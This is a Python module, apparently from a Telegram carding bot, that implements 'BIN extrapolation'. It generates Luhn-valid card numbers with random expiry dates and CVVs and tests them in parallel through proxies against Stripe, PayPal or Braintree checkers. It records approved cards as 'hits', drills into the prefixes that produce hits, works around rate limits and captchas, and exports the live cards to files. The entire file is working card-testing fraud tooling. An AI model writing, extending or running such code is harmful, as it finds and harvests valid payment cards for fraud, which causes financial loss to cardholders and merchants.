"""
BIN Extrapolator v2.1 - Advanced pattern discovery with parallel testing
Systematically discover active card patterns within a BIN with configurable parameters
Enhanced with rate limiting, captcha detection, and stealth infrastructure.
"""

import asyncio
import random
import json
import os
from typing import Dict, List, Tuple, Callable, Optional, Set
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from tools.card_generator import generate_luhn_valid, lookup_bin
from tools.rate_limiter import wait_for_rate_limit, report_rate_limit_hit, report_request_success


class _FallbackRateLimitError(Exception):
    """Fallback RateLimitError if not importable"""
    pass


try:
    from gates.shopify_nano import RateLimitError
except ImportError:
    RateLimitError = _FallbackRateLimitError


RESUME_DIR = Path("/tmp/extrap_sessions")
RESUME_DIR.mkdir(exist_ok=True)


@dataclass
class ExtrapolationResult:
    """Result of extrapolating a single pattern"""
    pattern: str
    tested: int = 0
    hits: int = 0
    hit_cards: List[str] = field(default_factory=list)
    generated_cards: List[str] = field(default_factory=list)
    
    @property
    def hit_rate(self) -> float:
        return (self.hits / self.tested * 100) if self.tested > 0 else 0.0
    
    def __str__(self):
        return f"{self.pattern}: {self.hits}/{self.tested} ({self.hit_rate:.1f}%)"


@dataclass
class ExtrapolationConfig:
    """Configuration for extrapolation run"""
    max_depth: int = 4
    cards_per_pattern: int = 10
    concurrency: int = 5
    gate: str = "stripe"
    continue_on_no_hits: bool = True
    auto_gen_on_hits: int = 25
    rate_limit_domain: str = "stripe.com"


GATE_DOMAINS = {
    "stripe": "stripe.com",
    "paypal": "paypal.com",
    "braintree": "braintreegateway.com",
}


@dataclass
class ExtrapolationSession:
    """Tracks an ongoing extrapolation session"""
    base_bin: str
    user_id: int
    chat_id: int
    config: ExtrapolationConfig = field(default_factory=ExtrapolationConfig)
    start_time: datetime = field(default_factory=datetime.now)
    is_running: bool = True
    current_depth: int = 0
    current_pattern: str = ""
    results: Dict[str, ExtrapolationResult] = field(default_factory=dict)
    best_patterns: List[ExtrapolationResult] = field(default_factory=list)
    total_tested: int = 0
    total_hits: int = 0
    patterns_tested: Set[str] = field(default_factory=set)
    all_hit_cards: List[str] = field(default_factory=list)
    estimated_total: int = 0
    pending_patterns: List[Tuple[str, int]] = field(default_factory=list)
    rate_limit_cooldowns: int = 0
    captcha_blocks: int = 0
    
    def stop(self):
        self.is_running = False
    
    def save_state(self, patterns_to_test: Optional[List[Tuple[str, int]]] = None):
        """Save session state for resume capability"""
        state = {
            'base_bin': self.base_bin,
            'user_id': self.user_id,
            'chat_id': self.chat_id,
            'config': {
                'max_depth': self.config.max_depth,
                'cards_per_pattern': self.config.cards_per_pattern,
                'concurrency': self.config.concurrency,
                'gate': self.config.gate,
                'continue_on_no_hits': self.config.continue_on_no_hits,
                'auto_gen_on_hits': self.config.auto_gen_on_hits,
            },
            'current_depth': self.current_depth,
            'current_pattern': self.current_pattern,
            'total_tested': self.total_tested,
            'total_hits': self.total_hits,
            'patterns_tested': list(self.patterns_tested),
            'all_hit_cards': self.all_hit_cards,
            'pending_patterns': patterns_to_test if patterns_to_test else self.pending_patterns,
            'best_patterns': [
                {'pattern': r.pattern, 'tested': r.tested, 'hits': r.hits, 'hit_cards': r.hit_cards}
                for r in self.best_patterns
            ]
        }
        filepath = RESUME_DIR / f"session_{self.user_id}.json"
        with open(filepath, 'w') as f:
            json.dump(state, f)
    
    @classmethod
    def load_state(cls, user_id: int) -> Optional['ExtrapolationSession']:
        """Load saved session state"""
        filepath = RESUME_DIR / f"session_{user_id}.json"
        if not filepath.exists():
            return None
        try:
            with open(filepath, 'r') as f:
                state = json.load(f)
            
            config = ExtrapolationConfig(
                max_depth=state['config']['max_depth'],
                cards_per_pattern=state['config']['cards_per_pattern'],
                concurrency=state['config'].get('concurrency', 5),
                gate=state['config']['gate'],
                continue_on_no_hits=state['config'].get('continue_on_no_hits', True),
                auto_gen_on_hits=state['config'].get('auto_gen_on_hits', 25),
            )
            
            session = cls(
                base_bin=state['base_bin'],
                user_id=state['user_id'],
                chat_id=state['chat_id'],
                config=config,
            )
            session.current_depth = state['current_depth']
            session.current_pattern = state['current_pattern']
            session.total_tested = state['total_tested']
            session.total_hits = state['total_hits']
            session.patterns_tested = set(state['patterns_tested'])
            session.all_hit_cards = state['all_hit_cards']
            session.pending_patterns = [(p[0], p[1]) for p in state.get('pending_patterns', [])]
            
            for p in state['best_patterns']:
                result = ExtrapolationResult(
                    pattern=p['pattern'],
                    tested=p['tested'],
                    hits=p['hits'],
                    hit_cards=p['hit_cards']
                )
                session.best_patterns.append(result)
            
            return session
        except Exception:
            return None
    
    def clear_saved_state(self):
        """Remove saved state file"""
        filepath = RESUME_DIR / f"session_{self.user_id}.json"
        if filepath.exists():
            filepath.unlink()


active_sessions: Dict[int, ExtrapolationSession] = {}


GATE_FUNCTIONS: Dict[str, Callable] = {}


def register_gate(name: str, func: Callable):
    """Register a gate function for use in extrapolation"""
    GATE_FUNCTIONS[name] = func


def generate_test_cards(pattern: str, count: int = 10) -> List[Tuple[str, str, str, str]]:
    """Generate test cards for a given pattern."""
    cards = []
    for _ in range(count):
        try:
            card_num = generate_luhn_valid(pattern, 16)
            mm = str(random.randint(1, 12)).zfill(2)
            yy = str(random.randint(26, 30))
            cvv = str(random.randint(100, 999))
            cards.append((card_num, mm, yy, cvv))
        except Exception:
            continue
    return cards


async def test_single_card(
    card_data: Tuple[str, str, str, str],
    check_func: Callable,
    proxy: Optional[dict] = None,
    rate_limit_domain: str = "stripe.com"
) -> Tuple[str, bool, str, bool, bool]:
    """
    Test a single card asynchronously using thread executor.
    
    Returns: (status, is_hit, card_str, is_rate_limited, is_captcha)
    """
    card_num, mm, yy, cvv = card_data
    card_str = f"{card_num}|{mm}|{yy}|{cvv}"
    loop = asyncio.get_event_loop()
    try:
        wait_for_rate_limit(rate_limit_domain)
        
        status, alive = await loop.run_in_executor(
            None,
            lambda: check_func(card_num, mm, yy, cvv, proxy)
        )
        status_upper = status.upper()
        
        is_rate_limited = "RATE LIMIT" in status_upper or "429" in status
        is_captcha = "CAPTCHA" in status_upper
        
        if is_rate_limited:
            report_rate_limit_hit(rate_limit_domain, 429)
        
        is_hit = (
            status_upper.startswith('APPROVED') or
            status_upper.startswith('CCN') or
            status_upper.startswith('CVV') or
            '✅' in status
        )
        
        if is_hit:
            report_request_success(rate_limit_domain)
        
        return (status, is_hit, card_str, is_rate_limited, is_captcha)
    except RateLimitError as e:
        report_rate_limit_hit(rate_limit_domain, getattr(e, 'status_code', 429))
        return (f"Rate Limited: {e}", False, card_str, True, False)
    except Exception as e:
        error_str = str(e).upper()
        is_rate_limited = "RATE LIMIT" in error_str or "429" in error_str
        is_captcha = "CAPTCHA" in error_str
        if is_rate_limited:
            report_rate_limit_hit(rate_limit_domain, 429)
        return (str(e), False, card_str, is_rate_limited, is_captcha)


@dataclass
class PatternTestResult:
    """Extended result with rate limit and captcha tracking"""
    result: ExtrapolationResult
    rate_limited_count: int = 0
    captcha_count: int = 0


async def test_pattern_parallel(
    pattern: str,
    check_func: Callable,
    proxy: Optional[dict] = None,
    cards_per_test: int = 10,
    concurrency: int = 5,
    rate_limit_domain: str = "stripe.com"
) -> PatternTestResult:
    """Test a pattern with parallel card testing for speed."""
    result = ExtrapolationResult(pattern=pattern)
    test_cards = generate_test_cards(pattern, cards_per_test)
    rate_limited_count = 0
    captcha_count = 0
    
    if not test_cards:
        return PatternTestResult(result=result)
    
    semaphore = asyncio.Semaphore(concurrency)
    
    async def bounded_test(card_data):
        async with semaphore:
            return await test_single_card(card_data, check_func, proxy, rate_limit_domain)
    
    tasks = [bounded_test(card) for card in test_cards]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for res in results:
        if isinstance(res, (Exception, BaseException)):
            continue
        if not isinstance(res, tuple) or len(res) < 5:
            continue
        status, is_hit, card_str, is_rate_limited, is_captcha = res
        result.tested += 1
        if is_rate_limited:
            rate_limited_count += 1
        if is_captcha:
            captcha_count += 1
        if is_hit:
            result.hits += 1
            result.hit_cards.append(card_str)
    
    return PatternTestResult(
        result=result,
        rate_limited_count=rate_limited_count,
        captcha_count=captcha_count
    )


async def extrapolate_bin_v2(
    session: ExtrapolationSession,
    check_func: Callable,
    progress_callback: Callable,
    proxy: Optional[dict] = None
) -> List[ExtrapolationResult]:
    """
    Advanced extrapolation with parallel testing and configurable parameters.
    
    Features:
    - Parallel card testing (configurable concurrency)
    - Configurable cards per pattern
    - Continue drilling even without hits
    - Auto-generate cards from hit patterns
    - Save progress for resume capability
    """
    patterns_with_hits = []
    config = session.config
    
    rate_limit_domain = GATE_DOMAINS.get(config.gate, "stripe.com")
    config.rate_limit_domain = rate_limit_domain
    
    session.estimated_total = 10 * config.cards_per_pattern * config.max_depth
    
    if session.pending_patterns:
        patterns_to_test: List[Tuple[str, int]] = list(session.pending_patterns)
        session.pending_patterns = []
    else:
        patterns_to_test = [(session.base_bin, 0)]
    
    while patterns_to_test and session.is_running:
        current_pattern, depth = patterns_to_test.pop(0)
        session.current_depth = depth
        session.current_pattern = current_pattern
        
        if depth >= config.max_depth:
            continue
        
        status_line = f"Tested: {session.total_tested} | Hits: {session.total_hits}"
        if session.rate_limit_cooldowns > 0:
            status_line += f" | ⏳ Rate limits: {session.rate_limit_cooldowns}"
        if session.captcha_blocks > 0:
            status_line += f" | 🛡️ Captchas: {session.captcha_blocks}"
        
        await progress_callback(
            f"📊 <b>Depth {depth + 1}/{config.max_depth}</b>\n"
            f"Pattern: <code>{current_pattern}x</code>\n"
            f"{status_line}\n"
            f"Cards/pattern: {config.cards_per_pattern} | Concurrency: {config.concurrency}"
        )
        
        depth_has_hits = False
        
        for digit in range(10):
            if not session.is_running:
                session.save_state(patterns_to_test)
                break
            
            test_pattern = f"{current_pattern}{digit}"
            
            if test_pattern in session.patterns_tested:
                continue
            
            session.patterns_tested.add(test_pattern)
            
            pattern_result = await test_pattern_parallel(
                test_pattern,
                check_func,
                proxy,
                config.cards_per_pattern,
                config.concurrency,
                rate_limit_domain
            )
            
            result = pattern_result.result
            session.rate_limit_cooldowns += pattern_result.rate_limited_count
            session.captcha_blocks += pattern_result.captcha_count
            
            session.total_tested += result.tested
            session.total_hits += result.hits
            session.results[test_pattern] = result
            
            if result.hits > 0:
                depth_has_hits = True
                patterns_with_hits.append(result)
                session.best_patterns.append(result)
                session.all_hit_cards.extend(result.hit_cards)
                
                if config.auto_gen_on_hits > 0:
                    extra_cards = generate_test_cards(test_pattern, config.auto_gen_on_hits)
                    result.generated_cards = [f"{c[0]}|{c[1]}|{c[2]}|{c[3]}" for c in extra_cards]
                
                patterns_to_test.append((test_pattern, depth + 1))
                
                await progress_callback(
                    f"✅ <b>HIT!</b> <code>{test_pattern}</code>\n"
                    f"{result.hits}/{result.tested} ({result.hit_rate:.0f}%)\n"
                    f"Total: {session.total_tested} tested, {session.total_hits} hits\n"
                    f"Drilling deeper..."
                )
            
            session.save_state(patterns_to_test)
            await asyncio.sleep(0.05)
        
        if not depth_has_hits and config.continue_on_no_hits and depth < config.max_depth - 1:
            for digit in range(10):
                next_pattern = f"{current_pattern}{digit}"
                if next_pattern not in session.patterns_tested:
                    patterns_to_test.append((next_pattern, depth + 1))
                    break
    
    session.best_patterns.sort(key=lambda x: (x.hits, x.hit_rate), reverse=True)
    return patterns_with_hits


def format_extrap_progress_v2(session: ExtrapolationSession, message: str) -> str:
    """Format a progress update message with live stats."""
    elapsed = (datetime.now() - session.start_time).seconds
    rate = session.total_tested / elapsed if elapsed > 0 else 0
    
    return f"""<b>🔍 BIN EXTRAPOLATION</b>

<b>Base BIN:</b> <code>{session.base_bin}</code>
<b>Elapsed:</b> {elapsed}s ({rate:.1f} cards/sec)
<b>Gate:</b> {session.config.gate}

{message}"""


def format_extrap_results_v2(session: ExtrapolationSession) -> str:
    """Format final extrapolation results with all stats."""
    elapsed = (datetime.now() - session.start_time).seconds
    rate = session.total_tested / elapsed if elapsed > 0 else 0
    
    infra_stats = ""
    if session.rate_limit_cooldowns > 0 or session.captcha_blocks > 0:
        infra_stats = f"\n<b>⚠️ Blocks:</b> {session.rate_limit_cooldowns} rate limits, {session.captcha_blocks} captchas"
    
    if not session.best_patterns:
        return f"""<b>BIN EXTRAPOLATION COMPLETE</b>

<b>Base BIN:</b> <code>{session.base_bin}</code>
<b>Duration:</b> {elapsed}s ({rate:.1f} cards/sec)
<b>Cards Tested:</b> {session.total_tested}
<b>Total Hits:</b> {session.total_hits}
<b>Gate:</b> {session.config.gate}{infra_stats}

❌ No active patterns found.

<i>Try:
- Increasing cards per pattern
- Using a different gate
- Testing a different BIN range</i>"""
    
    hit_rate = (session.total_hits / session.total_tested * 100) if session.total_tested else 0
    
    top_patterns = session.best_patterns[:10]
    patterns_text = "\n".join([
        f"<code>{r.pattern}</code> - {r.hits}/{r.tested} ({r.hit_rate:.0f}%)"
        for r in top_patterns
    ])
    
    sample_cards = session.all_hit_cards[:15]
    cards_text = "\n".join([f"<code>{c}</code>" for c in sample_cards])
    if len(session.all_hit_cards) > 15:
        cards_text += f"\n<i>...and {len(session.all_hit_cards) - 15} more in file</i>"
    
    return f"""<b>✅ BIN EXTRAPOLATION COMPLETE</b>

<b>Base BIN:</b> <code>{session.base_bin}</code>
<b>Duration:</b> {elapsed}s ({rate:.1f} cards/sec)
<b>Cards Tested:</b> {session.total_tested}
<b>Total Hits:</b> {session.total_hits}
<b>Hit Rate:</b> {hit_rate:.1f}%
<b>Gate:</b> {session.config.gate}{infra_stats}

<b>🎯 Best Extended Patterns:</b>
{patterns_text}

<b>✅ Hit Cards:</b>
{cards_text}

<i>Use /gen with extended pattern for more cards</i>"""


def export_results_to_file(session: ExtrapolationSession) -> Optional[str]:
    """Export all results to a downloadable file."""
    if not session.all_hit_cards and not session.best_patterns:
        return None
    
    filename = f"/tmp/extrap_{session.base_bin}_{session.user_id}.txt"
    
    with open(filename, 'w') as f:
        f.write(f"BIN EXTRAPOLATION RESULTS\n")
        f.write(f"========================\n\n")
        f.write(f"Base BIN: {session.base_bin}\n")
        f.write(f"Gate: {session.config.gate}\n")
        f.write(f"Cards Tested: {session.total_tested}\n")
        f.write(f"Total Hits: {session.total_hits}\n")
        f.write(f"Duration: {(datetime.now() - session.start_time).seconds}s\n\n")
        
        f.write(f"BEST PATTERNS:\n")
        f.write(f"--------------\n")
        for r in session.best_patterns[:20]:
            f.write(f"{r.pattern} - {r.hits}/{r.tested} ({r.hit_rate:.0f}%)\n")
        
        f.write(f"\nHIT CARDS ({len(session.all_hit_cards)}):\n")
        f.write(f"-------------------\n")
        for card in session.all_hit_cards:
            f.write(f"{card}\n")
        
        f.write(f"\nGENERATED CARDS FROM HIT PATTERNS:\n")
        f.write(f"-----------------------------------\n")
        for result in session.best_patterns[:5]:
            if result.generated_cards:
                f.write(f"\n# Pattern {result.pattern}:\n")
                for card in result.generated_cards:
                    f.write(f"{card}\n")
    
    return filename


def start_session(
    user_id: int, 
    chat_id: int, 
    base_bin: str,
    max_depth: int = 4,
    cards_per_pattern: int = 10,
    concurrency: int = 5,
    gate: str = "stripe"
) -> ExtrapolationSession:
    """Start a new extrapolation session with configurable parameters."""
    if user_id in active_sessions:
        active_sessions[user_id].stop()
    
    config = ExtrapolationConfig(
        max_depth=max_depth,
        cards_per_pattern=cards_per_pattern,
        concurrency=concurrency,
        gate=gate,
    )
    
    session = ExtrapolationSession(
        base_bin=base_bin,
        user_id=user_id,
        chat_id=chat_id,
        config=config,
    )
    active_sessions[user_id] = session
    return session


def resume_session(user_id: int) -> Optional[ExtrapolationSession]:
    """Resume a previously interrupted session."""
    session = ExtrapolationSession.load_state(user_id)
    if session:
        session.is_running = True
        active_sessions[user_id] = session
    return session


def stop_session(user_id: int) -> bool:
    """Stop an active extrapolation session."""
    if user_id in active_sessions:
        active_sessions[user_id].stop()
        active_sessions[user_id].save_state()
        del active_sessions[user_id]
        return True
    return False


def get_session(user_id: int) -> Optional[ExtrapolationSession]:
    """Get active session for a user."""
    return active_sessions.get(user_id)


def has_saved_session(user_id: int) -> bool:
    """Check if user has a saved session to resume."""
    filepath = RESUME_DIR / f"session_{user_id}.json"
    return filepath.exists()


def get_available_gates() -> List[str]:
    """Get list of available gates for extrapolation."""
    return list(GATE_FUNCTIONS.keys()) if GATE_FUNCTIONS else ["stripe", "paypal", "braintree"]
